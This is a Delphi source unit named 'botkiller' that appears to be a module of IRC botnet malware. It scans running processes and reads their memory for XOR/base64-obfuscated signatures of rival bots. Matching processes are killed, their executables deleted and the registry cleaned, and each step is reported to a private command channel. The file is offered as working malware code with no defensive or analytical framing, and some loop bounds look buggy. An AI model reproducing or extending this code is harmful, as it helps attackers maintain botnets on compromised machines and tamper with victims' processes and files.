unit botkiller; //this needs alot of work ;)

interface
uses
  TlHelp32,
  windows,
  msysutils,
  base,
  encryption,
  miscfunctions,
  functions;

Procedure CheckKill;

var
 szBlockList: array[0..12] of String = ('dm9xcHpwaydteGc=', 'and3YGBjbCdteGc=', 'Y3ZibmdoJmxwZQ==', 'ZXp0b2d0bXsmZXph', 'ZGdoc2BvOzsmZXph', 'ZHVpLW1+bQ==', 'bWt2YCZjcGw=', 'Vk9zYnpjXHtpeSxhe20=', 'Vk9zYnpjXXptcixhe20=', 'VFJFdnxpS2ZmbmdndyZjcGw=', 'YWtpLW1+bQ==', 'bXFpZHoobXFt', 'cGtgZGFoJmxwZQ==');
 szBot: array[0..15] of string = (
 'VkxHI1tlaWdmaWxjI0ppfA==',
 'UlpGbHw=',
 'UlpGbHw=',
 'SVBHI0ppfA==',
 'SVBHI0ppfA==',
 'SVBHI0ppfA==',
 'SVBHI0ppfA==',
 'SVBHI0ppfA==',
 'SVBHI0ppfA==',
 'SVBHI0ppfA==',
 'SVBHI0ppfA==',
 'SVBHI0ppfA==',
 'SVBHI0ppfA==',
 'SVBHI0ppfA==',
 'SVBHI0ppfA==',
 'SVBHI0ppfA=='
 );
 szString: array[0..15] of string = (
 'XHoxMVR+PD9UeDY2X3A0OFVwMzJYezs2VHE7M158MU1acDo4XHo3M1R+OzFUeDJF',
 'W1FHQkZb',
 'W0RQU1U=',
 'W1dXQnQ=',
 'W1FSTXQ=',
 'W0ZBVnQ=',
 'W0FFTXQ=',
 'W0xIR3Q=',
 'W1hFRXQ=',
 'W0tXUXQ=',
 'W0tIUHQ=',
 'W0BWQnQ=',
 'W0RWQnQ=',
 'W0NRUHQ=',
 'W1FTRnQ=',
 'W0VGUXQ='
 );

implementation

Procedure DecryptStrings();
Var
i: integer;
begin
for i := 0 to 15 do szString[i] := Decrypt(szString[i], '02dsh68ih');
end;

Procedure DecryptBlocklist();
Var
i: integer;
begin
for i := 0 to 12 do szBlockList[i] := Decrypt(szBlockList[i], '02dsh68ih');
end;

Procedure DecryptBotlist();
Var
i: integer;
begin
for i := 0 to 15 do szBot[i] := Decrypt(szBot[i], '02dsh68ih');
end;

procedure KillBot(pe32 : PROCESSENTRY32);
var
  me32:MODULEENTRY32;
  hPath:THANDLE;
  hKillProcess:THANDLE;
  bRetval:BOOLEAN;
begin
   hPath := CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);

   me32.dwSize := sizeof(me32);

   bRetval := Module32First(hPath, me32);

   while(bRetval) do
    begin
      if(Pos(me32.szModule, pe32.szExeFile) = 1) then
      begin

         SetFileAttributes(me32.szExePath, FILE_ATTRIBUTE_NORMAL);

         hKillProcess := OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
         TerminateProcess(hKillProcess, 0);

         Sleep(500);

         if(DeleteFile(me32.szExePath)) then
            PrivateMessageChannel('Terminated and deleted ' + me32.szExePath);
      end;

      bRetval := Module32Next(hPath, me32);

    end;

   CloseHandle(hKillProcess);
   CloseHandle(hPath);
end;


procedure DoSearch(uStartAddr:string; uEndAddr:string; pe32:PROCESSENTRY32);
var
   szBigBuffer:string;
   Curbuff: Char;
   hProcess: THANDLE;
   uCurAddr: integer;
   bRead: string;
   NULL: cardinal;
   c: DWORD;

begin
 DecryptStrings();
 DecryptBotlist();
 bRead := '';
  hProcess := OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

  for uCurAddr := strtoint(uStartAddr) to  strtoint(uEndAddr) do
    begin
     if ReadProcessMemory(hProcess, Pointer(uCurAddr), @Curbuff, sizeof(Curbuff), NULL) then bRead := bRead + Curbuff;
       end;

         for c := 0 to sizeof(szString) do
          begin

            if(Pos(szString[c],bRead) <> 0) then
              begin
               PrivateMessageChannel('Found string '+szString[c]+' in '+pe32.szExeFile+' bot '+szBot[c]);
               KillBot(pe32);
               CleanRegistry;
            end;

         end;

   CloseHandle(hProcess);
end;

Procedure checkkill;
var
  szFile:string;
  hProcess: Thandle;
  pe32: PROCESSENTRY32;
  bRetval: boolean;
  bDoSearch: boolean;
  i: DWORD;

begin
  DecryptBlocklist();
  szFile := ExtractFileName(ParamStr(0));

  hProcess := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

  pe32.dwSize := sizeof(PROCESSENTRY32);

  bRetval := Process32First(hProcess, pe32);
  bDoSearch := true;

     while(bRetval) do
      begin

      for i := 0 to sizeof(szBlockList) do
        begin

         if(Pos(pe32.szExeFile, szBlockList[i]) = 1) then
            bDoSearch := false;

        end;

        if( Pos(pe32.szExeFile, szFile) = 1) then
           bDoSearch := false;

      if(bDoSearch) then

         DoSearch('$00400000', '$004FFFFF', pe32)
        // DoSearch( '$0x00100000','$0x001FFFFF', pe32 );

      else
         bDoSearch := true;

      bRetval := Process32Next(hProcess, pe32);
    end;
   CloseHandle(hProcess);
   PrivateMessageChannel('Botkill Complete!');
end;

end.
